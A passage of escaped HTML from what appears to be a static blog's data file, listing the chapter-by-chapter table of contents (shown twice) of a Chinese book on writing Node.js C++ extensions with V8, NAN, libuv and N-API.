class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 Node.js 的 C++ 扩展前驱知识储备 1</span><br><span class=\"line\">1.1 Node.js 的模块机制 2</span><br><span class=\"line\">1.1.1 CommonJS 的模块规范 2</span><br><span class=\"line\">1.1.2 Node.js 的模块 4</span><br><span class=\"line\">1.1.3 小结 9</span><br><span class=\"line\">1.1.4 参考资料 9</span><br><span class=\"line\">1.2 Node.js 的包机制 9</span><br><span class=\"line\">1.2.1 CommonJS 的包规范 9</span><br><span class=\"line\">1.2.2 Node.js / NPM 下的包 13</span><br><span class=\"line\">1.2.3 NPM 与 CNPM 16</span><br><span class=\"line\">1.2.4 小结 19</span><br><span class=\"line\">1.2.5 参考资料 19</span><br><span class=\"line\">1.3 Node.js 依赖简介 20</span><br><span class=\"line\">1.3.1 Chrome V8 20</span><br><span class=\"line\">1.3.2 libuv 25</span><br><span class=\"line\">1.3.3 其他依赖 28</span><br><span class=\"line\">1.3.4 小结 30</span><br><span class=\"line\">1.3.5 参考资料 30</span><br><span class=\"line\">1.4 C++ 扩展开发的准备工作 31</span><br><span class=\"line\">1.4.1 编辑器 / IDE 31</span><br><span class=\"line\">1.4.2 node-gyp 36</span><br><span class=\"line\">1.4.3 其他构建工具 54</span><br><span class=\"line\">1.4.4 小结 56</span><br><span class=\"line\">1.4.5 参考资料 56</span><br><span class=\"line\"></span><br><span class=\"line\">2 C++ 模块原理简析 57</span><br><span class=\"line\">2.1 为什么要写 C++ 模块 57</span><br><span class=\"line\">2.1.1 C++ 比 JavaScript 解释器高效 57</span><br><span class=\"line\">2.1.2 已有的 C++ 轮子 72</span><br><span class=\"line\">2.1.3 小结 77</span><br><span class=\"line\">2.1.4 参考资料 77</span><br><span class=\"line\">2.2 什么是 C++ 扩展 78</span><br><span class=\"line\">2.2.1 C++ 模块本质 78</span><br><span class=\"line\">2.2.2 Node.js 模块加载原理 80</span><br><span class=\"line\">2.2.3 小结 102</span><br><span class=\"line\">2.2.4 参考资料 103</span><br><span class=\"line\"></span><br><span class=\"line\">3 Chrome V8 基础 104</span><br><span class=\"line\">3.1 Node.js 与 Chrome V8 104</span><br><span class=\"line\">3.2 基本概念 105</span><br><span class=\"line\">3.2.1 内存机制 105</span><br><span class=\"line\">3.2.2 隔离实例（Isolate） 108</span><br><span class=\"line\">3.2.3 上下文（Context） 109</span><br><span class=\"line\">3.2.4 脚本（Script） 110</span><br><span class=\"line\">3.2.5 小结 110</span><br><span class=\"line\">3.2.6 参考资料 111</span><br><span class=\"line\">3.3 句柄（Handle） 111</span><br><span class=\"line\">3.3.1 本地句柄（Local） 112</span><br><span class=\"line\">3.3.2 持久句柄（Persistent） 115</span><br><span class=\"line\">3.3.3 永生句柄（Eternal） 119</span><br><span class=\"line\">3.3.4 待实本地句柄（Maybe Local） 119</span><br><span class=\"line\">3.3.5 小结 121</span><br><span class=\"line\">3.3.6 参考资料 121</span><br><span class=\"line\">3.4 句柄作用域 121</span><br><span class=\"line\">3.4.1 一般句柄作用域（Handle Scope） 122</span><br><span class=\"line\">3.4.2 可逃句柄作用域（Escapable Handle Scope） 125</span><br><span class=\"line\">3.4.3 小结 129</span><br><span class=\"line\">3.4.4 参考资料 129</span><br><span class=\"line\">3.5 上下文（Context） 129</span><br><span class=\"line\">3.6 模板（Template） 133</span><br><span class=\"line\">3.6.1 函数模板（Function Template） 133</span><br><span class=\"line\">3.6.2 对象模板（Object Template） 138</span><br><span class=\"line\">3.6.3 对象模板的访问器（Accessor）与拦截器（Interceptor） 144</span><br><span class=\"line\">3.6.4 对象模板的内置字段（Internal Field） 175</span><br><span class=\"line\">3.6.5 函数模板的继承（Inherit） 183</span><br><span class=\"line\">3.6.6 小结 188</span><br><span class=\"line\">3.6.7 参考资料 189</span><br><span class=\"line\">3.7 常用数据类型 189</span><br><span class=\"line\">3.7.1 基值（Value） 189</span><br><span class=\"line\">3.7.2 字符串（String） 194</span><br><span class=\"line\">3.7.3 数值类型 196</span><br><span class=\"line\">3.7.4 布尔类型（Boolean） 196</span><br><span class=\"line\">3.7.5 对象（Object） 196</span><br><span class=\"line\">3.7.6 函数（Function） 200</span><br><span class=\"line\">3.7.7 数组（Array） 202</span><br><span class=\"line\">3.7.8 JSON 解析器 203</span><br><span class=\"line\">3.7.9 函数回调信息（Function Callback Info） 203</span><br><span class=\"line\">3.7.10 函数返回值（Return Value） 204</span><br><span class=\"line\">3.7.11 隔离实例（Isolate） 204</span><br><span class=\"line\">3.7.12 小结 205</span><br><span class=\"line\">3.7.13 参考资料 206</span><br><span class=\"line\">3.8 异常机制 206</span><br><span class=\"line\">3.8.1 try-catch 206</span><br><span class=\"line\">3.8.2 抛出异常 209</span><br><span class=\"line\">3.8.3 异常生成类（Exception） 211</span><br><span class=\"line\">3.8.4 小结 211</span><br><span class=\"line\">3.8.5 参考资料 211</span><br><span class=\"line\"></span><br><span class=\"line\">4 C++ 扩展实战初探 212</span><br><span class=\"line\">4.1 binding.gyp 212</span><br><span class=\"line\">4.1.1 惊鸿一瞥 213</span><br><span class=\"line\">4.1.2 binding.gyp 基础结构 213</span><br><span class=\"line\">4.1.3 GYP 文件 214</span><br><span class=\"line\">4.1.4 常用字段 221</span><br><span class=\"line\">4.1.5 小结 228</span><br><span class=\"line\">4.1.6 参考资料 228</span><br><span class=\"line\">4.2 牛刀小试 229</span><br><span class=\"line\">4.2.1 又是 Hello World 229</span><br><span class=\"line\">4.2.2 函数参数 232</span><br><span class=\"line\">4.2.3 回调函数 234</span><br><span class=\"line\">4.2.4 函数返回 238</span><br><span class=\"line\">4.2.5 小结 239</span><br><span class=\"line\">4.2.6 参考资料 240</span><br><span class=\"line\">4.3 循序渐进 240</span><br><span class=\"line\">4.3.1 C++ 与 JavaScript 类封装 240</span><br><span class=\"line\">4.3.2 实例化 C++ 类封装对象的函数 250</span><br><span class=\"line\">4.3.3 将 C++ 类封装对象传来传去 253</span><br><span class=\"line\">4.3.4 进程退出钩子 255</span><br><span class=\"line\">4.3.5 小结 259</span><br><span class=\"line\">4.3.6 参考资料 259</span><br><span class=\"line\"></span><br><span class=\"line\">5 Node.js 原生抽象——NAN 260</span><br><span class=\"line\">5.1 Node.js 原生模块开发方式的变迁 260</span><br><span class=\"line\">5.1.1 以不变应万变 260</span><br><span class=\"line\">5.1.2 时代在召唤 261</span><br><span class=\"line\">5.1.3 小结 267</span><br><span class=\"line\">5.1.4 参考资料 267</span><br><span class=\"line\">5.2 基础开发 267</span><br><span class=\"line\">5.2.1 什么是 NAN 267</span><br><span class=\"line\">5.2.2 安装和配置 269</span><br><span class=\"line\">5.2.3 先睹为快——搭上NAN 的快车 270</span><br><span class=\"line\">5.2.4 基础帮助函数和宏 276</span><br><span class=\"line\">5.2.5 忽略 node_modules 279</span><br><span class=\"line\">5.2.6 小结 279</span><br><span class=\"line\">5.2.7 参考资料 280</span><br><span class=\"line\">5.3 JavaScript 函数 280</span><br><span class=\"line\">5.3.1 函数参数类型 280</span><br><span class=\"line\">5.3.2 函数声明 282</span><br><span class=\"line\">5.3.3 函数设置 288</span><br><span class=\"line\">5.3.4 小结 296</span><br><span class=\"line\">5.3.5 参考资料 296</span><br><span class=\"line\">5.4 常用帮助类与函数 296</span><br><span class=\"line\">5.4.1 句柄相关 296</span><br><span class=\"line\">5.4.2 创建数据对象 298</span><br><span class=\"line\">5.4.3 与数据对象“玩耍” 300</span><br><span class=\"line\">5.4.4 封装一个类 314</span><br><span class=\"line\">5.4.5 异常处理 315</span><br><span class=\"line\">5.4.6 小结 315</span><br><span class=\"line\">5.4.7 参考资料 316</span><br><span class=\"line\">5.5 NAN 中的异步机制 316</span><br><span class=\"line\">5.5.1 Nan::AsyncQueueWorker 316</span><br><span class=\"line\">5.5.2 Nan::Callback 317</span><br><span class=\"line\">5.5.3 Nan::AsyncWorker 317</span><br><span class=\"line\">5.5.4 Nan::AsyncProgressWorker 323</span><br><span class=\"line\">5.5.5 小结 327</span><br><span class=\"line\">5.5.6 参考资料 327</span><br><span class=\"line\"></span><br><span class=\"line\">6 异步之旅——libuv 328</span><br><span class=\"line\">6.1 基础概念 329</span><br><span class=\"line\">6.1.1 事件循环 330</span><br><span class=\"line\">6.1.2 句柄（Handle）与请求（Request） 333</span><br><span class=\"line\">6.1.3 尝尝甜头 335</span><br><span class=\"line\">6.1.4 小结 340</span><br><span class=\"line\">6.1.5 参考资料 340</span><br><span class=\"line\">6.2 libuv 的跨线程编程基础 341</span><br><span class=\"line\">6.2.1 libuv 的线程 342</span><br><span class=\"line\">6.2.2 同步原语（Synchronization Primitive） 347</span><br><span class=\"line\">6.2.3 工作队列 355</span><br><span class=\"line\">6.2.4 小结 356</span><br><span class=\"line\">6.2.5 参考资料 357</span><br><span class=\"line\">6.3 跨线程通信 357</span><br><span class=\"line\">6.3.1 uv_async_t 句柄 357</span><br><span class=\"line\">6.3.2 Watchdog 半成品实战解析 358</span><br><span class=\"line\">6.3.3 Watchdog 试运行 367</span><br><span class=\"line\">6.3.4 小结 368</span><br><span class=\"line\">6.3.5 参考资料 369</span><br><span class=\"line\"></span><br><span class=\"line\">7 实战——文件监视器 370</span><br><span class=\"line\">7.1 准备工作 370</span><br><span class=\"line\">7.1.1 功能规划 370</span><br><span class=\"line\">7.1.2 文件系统监听库——efsw 373</span><br><span class=\"line\">7.1.3 小结 376</span><br><span class=\"line\">7.1.4 参考资料 376</span><br><span class=\"line\">7.2 核心设计 376</span><br><span class=\"line\">7.2.1 API 设计 377</span><br><span class=\"line\">7.2.2 EFSWCore 的血肉之躯 377</span><br><span class=\"line\">7.2.3 EFSWCore 的灵魂 381</span><br><span class=\"line\">7.2.4 小结 385</span><br><span class=\"line\">7.3 编写JavaScript 类 386</span><br><span class=\"line\">7.3.1 类的设计 386</span><br><span class=\"line\">7.3.2 核心逻辑 388</span><br><span class=\"line\">7.3.3 简单容错 391</span><br><span class=\"line\">7.3.4 小结 393</span><br><span class=\"line\">7.4 进一步完善 393</span><br><span class=\"line\">7.4.1 C++ 代码的完善 393</span><br><span class=\"line\">7.4.2 JavaScript 代码的完善 398</span><br><span class=\"line\">7.4.3 小结 400</span><br><span class=\"line\"></span><br><span class=\"line\">8 实战——现有包剖析 401</span><br><span class=\"line\">8.1 字符串哈希模块——Bling Hashes 401</span><br><span class=\"line\">8.1.1 文件设定 402</span><br><span class=\"line\">8.1.2 C++ 源码剖析 403</span><br><span class=\"line\">8.1.3 JavaScript 源码剖析 408</span><br><span class=\"line\">8.1.4 小结 409</span><br><span class=\"line\">8.1.5 参考资料 410</span><br><span class=\"line\">8.2 类 Proxy 包——Auto Object 410</span><br><span class=\"line\">8.2.1 Proxy 410</span><br><span class=\"line\">8.2.2 Auto Object 使用范例 412</span><br><span class=\"line\">8.2.3 代码剖析 415</span><br><span class=\"line\">8.2.4 小结 424</span><br><span class=\"line\">8.2.5 参考资料 424</span><br><span class=\"line\"></span><br><span class=\"line\">9 N-API——下一代 Node.js C++ 扩展开发方式 425</span><br><span class=\"line\">9.1 浅尝辄止 426</span><br><span class=\"line\">9.1.1 实现一个 Echo 函数 426</span><br><span class=\"line\">9.1.2 尝试运行 N-API 扩展 430</span><br><span class=\"line\">9.1.3 向下兼容 431</span><br><span class=\"line\">9.1.4 N-API Package——C++ 封装 433</span><br><span class=\"line\">9.1.5 小结 433</span><br><span class=\"line\">9.1.6 参考资料 433</span><br><span class=\"line\">9.2 基本数据类型与错误处理 433</span><br><span class=\"line\">9.2.1 基本数据类型 433</span><br><span class=\"line\">9.2.2 与作用域及生命周期相关的数据类型 435</span><br><span class=\"line\">9.2.3 回调数据类型 438</span><br><span class=\"line\">9.2.4 错误处理 439</span><br><span class=\"line\">9.2.5 模块注册 441</span><br><span class=\"line\">9.2.6 小结 442</span><br><span class=\"line\">9.2.7 参考资料 442</span><br><span class=\"line\">9.3 对象与函数 442</span><br><span class=\"line\">9.3.1 对象 442</span><br><span class=\"line\">9.3.2 函数 448</span><br><span class=\"line\">9.3.3 类的封装 453</span><br><span class=\"line\">9.3.4 小结 455</span><br><span class=\"line\">9.3.5 参考资料 455</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://cnodejs.org/topic/5b223c1d5cd02be640901490\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<hr>\n<p><a href=\"https://www.npmjs.com/package/node-gyp\" target=\"_blank\" rel=\"noopener\">GYP介绍: Node.js本机插件构建工具</a><br><a href=\"https://blog.csdn.net/p13503959390/article/details/72793448\" target=\"_blank\" rel=\"noopener\">使用技巧</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"《Node-js：来一打-C-扩展》\"><a href=\"#《Node-js：来一打-C-扩展》\" class=\"headerlink\" title=\"《Node.js：来一打 C++ 扩展》\"></a>《Node.js：来一打 C++ 扩展》</h2><h3 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 Node.js 的 C++ 扩展前驱知识储备 1</span><br><span class=\"line\">1.1 Node.js 的模块机制 2</span><br><span class=\"line\">1.1.1 CommonJS 的模块规范 2</span><br><span class=\"line\">1.1.2 Node.js 的模块 4</span><br><span class=\"line\">1.1.3 小结 9</span><br><span class=\"line\">1.1.4 参考资料 9</span><br><span class=\"line\">1.2 Node.js 的包机制 9</span><br><span class=\"line\">1.2.1 CommonJS 的包规范 9</span><br><span class=\"line\">1.2.2 Node.js / NPM 下的包 13</span><br><span class=\"line\">1.2.3 NPM 与 CNPM 16</span><br><span class=\"line\">1.2.4 小结 19</span><br><span class=\"line\">1.2.5 参考资料 19</span><br><span class=\"line\">1.3 Node.js 依赖简介 20</span><br><span class=\"line\">1.3.1 Chrome V8 20</span><br><span class=\"line\">1.3.2 libuv 25</span><br><span class=\"line\">1.3.3 其他依赖 28</span><br><span class=\"line\">1.3.4 小结 30</span><br><span class=\"line\">1.3.5 参考资料 30</span><br><span class=\"line\">1.4 C++ 扩展开发的准备工作 31</span><br><span class=\"line\">1.4.1 编辑器 / IDE 31</span><br><span class=\"line\">1.4.2 node-gyp 36</span><br><span class=\"line\">1.4.3 其他构建工具 54</span><br><span class=\"line\">1.4.4 小结 56</span><br><span class=\"line\">1.4.5 参考资料 56</span><br><span class=\"line\"></span><br><span class=\"line\">2 C++ 模块原理简析 57</span><br><span class=\"line\">2.1 为什么要写 C++ 模块 57</span><br><span class=\"line\">2.1.1 C++ 比 JavaScript 解释器高效 57</span><br><span class=\"line\">2.1.2 已有的 C++ 轮子 72</span><br><span class=\"line\">2.1.3 小结 77</span><br><span class=\"line\">2.1.4 参考资料 77</span><br><span class=\"line\">2.2 什么是 C++ 扩展 78</span><br><span class=\"line\">2.2.1 C++ 模块本质 78</span><br><span class=\"line\">2.2.2 Node.js 模块加载原理 80</span><br><span class=\"line\">2.2.3 小结 102</span><br><span class=\"line\">2.2.4 参考资料 103</span><br><span class=\"line\"></span><br><span class=\"line\">3 Chrome V8 基础 104</span><br><span class=\"line\">3.1 Node.js 与 Chrome V8 104</span><br><span class=\"line\">3.2 基本概念 105</span><br><span class=\"line\">3.2.1 内存机制 105</span><br><span class=\"line\">3.2.2 隔离实例（Isolate） 108</span><br><span class=\"line\">3.2.3 上下文（Context） 109</span><br><span class=\"line\">3.2.4 脚本（Script） 110</span><br><span class=\"line\">3.2.5 小结 110</span><br><span class=\"line\">3.2.6 参考资料 111</span><br><span class=\"line\">3.3 句柄（Handle） 111</span><br><span class=\"line\">3.3.1 本地句柄（Local） 112</span><br><span class=\"line\">3.3.2 持久句柄（Persistent） 115</span><br><span class=\"line\">3.3.3 永生句柄（Eternal） 119</span><br><span class=\"line\">3.3.4 待实本地句柄（Maybe Local） 119</span><br><span class=\"line\">3.3.5 小结 121</span><br><span class=\"line\">3.3.6 参考资料 121</span><br><span class=\"line\">3.4 句柄作用域 121</span><br><span class=\"line\">3.4.1 一般句柄作用域（Handle Scope） 122</span><br><span class=\"line\">3.4.2 可逃句柄作用域（Escapable Handle Scope） 125</span><br><span class=\"line\">3.4.3 小结 129</span><br><span class=\"line\">3.4.4 参考资料 129</span><br><span class=\"line\">3.5 上下文（Context） 129</span><br><span class=\"line\">3.6 模板（Template） 133</span><br><span class=\"line\">3.6.1 函数模板（Function Template） 133</span><br><span class=\"line\">3.6.2 对象模板（Object Template） 138</span><br><span class=\"line\">3.6.3 对象模板的访问器（Accessor）与拦截器（Interceptor） 144</span><br><span class=\"line\">3.6.4 对象模板的内置字段（Internal Field） 175</span><br><span class=\"line\">3.6.5 函数模板的继承（Inherit） 183</span><br><span class=\"line\">3.6.6 小结 188</span><br><span class=\"line\">3.6.7 参考资料 189</span><br><span class=\"line\">3.7 常用数据类型 189</span><br><span class=\"line\">3.7.1 基值（Value） 189</span><br><span class=\"line\">3.7.2 字符串（String） 194</span><br><span class=\"line\">3.7.3 数值类型 196</span><br><span class=\"line\">3.7.4 布尔类型（Boolean） 196</span><br><span class=\"line\">3.7.5 对象（Object） 196</span><br><span class=\"line\">3.7.6 函数（Function） 200</span><br><span class=\"line\">3.7.7 数组（Array） 202</span><br><span class=\"line\">3.7.8 JSON 解析器 203</span><br><span class=\"line\">3.7.9 函数回调信息（Function Callback Info） 203</span><br><span class=\"line\">3.7.10 函数返回值（Return Value） 204</span><br><span class=\"line\">3.7.11 隔离实例（Isolate） 204</span><br><span class=\"line\">3.7.12 小结 205</span><br><span class=\"line\">3.7.13 参考资料 206</span><br><span class=\"line\">3.8 异常机制 206</span><br><span class=\"line\">3.8.1 try-catch 206</span><br><span class=\"line\">3.8.2 抛出异常 209</span><br><span class=\"line\">3.8.3 异常生成类（Exception） 211</span><br><span class=\"line\">3.8.4 小结 211</span><br><span class=\"line\">3.8.5 参考资料 211</span><br><span class=\"line\"></span><br><span class=\"line\">4 C++ 扩展实战初探 212</span><br><span class=\"line\">4.1 binding.gyp 212</span><br><span class=\"line\">4.1.1 惊鸿一瞥 213</span><br><span class=\"line\">4.1.2 binding.gyp 基础结构 213</span><br><span class=\"line\">4.1.3 GYP 文件 214</span><br><span class=\"line\">4.1.4 常用字段 221</span><br><span class=\"line\">4.1.5 小结 228</span><br><span class=\"line\">4.1.6 参考资料 228</span><br><span class=\"line\">4.2 牛刀小试 229</span><br><span class=\"line\">4.2.1 又是 Hello World 229</span><br><span class=\"line\">4.2.2 函数参数 232</span><br><span class=\"line\">4.2.3 回调函数 234</span><br><span class=\"line\">4.2.4 函数返回 238</span><br><span class=\"line\">4.2.5 小结 239</span><br><span class=\"line\">4.2.6 参考资料 240</span><br><span class=\"line\">4.3 循序渐进 240</span><br><span class=\"line\">4.3.1 C++ 与 JavaScript 类封装 240</span><br><span class=\"line\">4.3.2 实例化 C++ 类封装对象的函数 250</span><br><span class=\"line\">4.3.3 将 C++ 类封装对象传来传去 253</span><br><span class=\"line\">4.3.4 进程退出钩子 255</span><br><span class=\"line\">4.3.5 小结 259</span><br><span class=\"line\">4.3.6 参考资料 259</span><br><span class=\"line\"></span><br><span class=\"line\">5 Node.js 原生抽象——NAN 260</span><br><span class=\"line\">5.1 Node.js 原生模块开发方式的变迁 260</span><br><span class=\"line\">5.1.1 以不变应万变 260</span><br><span class=\"line\">5.1.2 时代在召唤 261</span><br><span class=\"line\">5.1.3 小结 267</span><br><span class=\"line\">5.1.4 参考资料 267</span><br><span class=\"line\">5.2 基础开发 267</span><br><span class=\"line\">5.2.1 什么是 NAN 267</span><br><span class=\"line\">5.2.2 安装和配置 269</span><br><span class=\"line\">5.2.3 先睹为快——搭上NAN 的快车 270</span><br><span class=\"line\">5.2.4 基础帮助函数和宏 276</span><br><span class=\"line\">5.2.5 忽略 node_modules 279</span><br><span class=\"line\">5.2.6 小结 279</span><br><span class=\"line\">5.2.7 参考资料 280</span><br><span class=\"line\">5.3 JavaScript 函数 280</span><br><span class=\"line\">5.3.1 函数参数类型 280</span><br><span class=\"line\">5.3.2 函数声明 282</span><br><span class=\"line\">5.3.3 函数设置 288</span><br><span class=\"line\">5.3.4 小结 296</span><br><span class=\"line\">5.3.5 参考资料 296</span><br><span class=\"line\">5.4 常用帮助类与函数 296</span><br><span class=\"line\">5.4.1 句柄相关 296</span><br><span class=\"line\">5.4.2 创建数据对象 298</span><br><span class=\"line\">5.4.3 与数据对象“玩耍” 300</span><br><span class=\"line\">5.4.4 封装一个类 314</span><br><span class=\"line\">5.4.5 异常处理 315</span><br><span class=\"line\">5.4.6 小结 315</span><br><span class=\"line\">5.4.7 参考资料 316</span><br><span class=\"line\">5.5 NAN 中的异步机制 316</span><br><span class=\"line\">5.5.1 Nan::AsyncQueueWorker 316</span><br><span class=\"line\">5.5.2 Nan::Callback 317</span><br><span class=\"line\">5.5.3 Nan::AsyncWorker 317</span><br><span class=\"line\">5.5.4 Nan::AsyncProgressWorker 323</span><br><span class=\"line\">5.5.5 小结 327</span><br><span class=\"line\">5.5.6 参考资料 327</span><br><span class=\"line\"></span><br><span class=\"line\">6 异步之旅——libuv 328</span><br><span class=\"line\">6.1 基础概念 329</span><br><span class=\"line\">6.1.1 事件循环 330</span><br><span class=\"line\">6.1.2 句柄（Handle）与请求（Request） 333</span><br><span class=\"line\">6.1.3 尝尝甜头 335</span><br><span class=\"line\">6.1.4 小结 340</span><br><span class=\"line\">6.1.5 参考资料 340</span><br><span class=\"line\">6.2 libuv 的跨线程编程基础 341</span><br><span class=\"line\">6.2.1 libuv 的线程 342</span><br><span class=\"line\">6.2.2 同步原语（Synchronization Primitive） 347</span><br><span class=\"line\">6.2.3 工作队列 355</span><br><span class=\"line\">6.2.4 小结 356</span><br><span class=\"line\">6.2.5 参考资料 357</span><br><span class=\"line\">6.3 跨线程通信 357</span><br><span class=\"line\">6.3.1 uv_async_t 句柄 357</span><br><span class=\"line\">6.3.2 Watchdog 半成品实战解析 358</span><br><span class=\"line\">6.3.3 Watchdog 试运行 367</span><br><span class=\"line\">6.3.4 小结 368</span><br><span class=\"line\">6.3.5 参考资料 369</span><br><span class=\"line\"></span><br><span class=\"line\">7 实战——文件监视器 370</span><br><span class=\"line\">7.1 准备工作 370</span><br><span class=\"line\">7.1.1 功能规划 370</span><br><span class=\"line\">7.1.2 文件系统监听库——efsw 373</span><br><span class=\"line\">7.1.3 小结 376</span><br><span class=\"line\">7.1.4 参考资料 376</span><br><span class=\"line\">7.2 核心设计 376</span><br><span class=\"line\">7.2.1 API 设计 377</span><br><span class=\"line\">7.2.2 EFSWCore 的血肉之躯 377</span><br><span class=\"line\">7.2.3 EFSWCore 的灵魂 381</span><br><span class=\"line\">7.2.4 小结 385</span><br><span class=\"line\">7.3 编写JavaScript 类 386</span><br><span class=\"line\">7.3.1 类的设计 386</span><br><span class=\"line\">7.3.2 核心逻辑 388</span><br><span class=\"line\">7.3.3 简单容错 391</span><br><span class=\"line\">7.3.4 小结 393</span><br><span class=\"line\">7.4 进一步完善 393</span><br><span class=\"line\">7.4.1 C++ 代码的完善 393</span><br><span 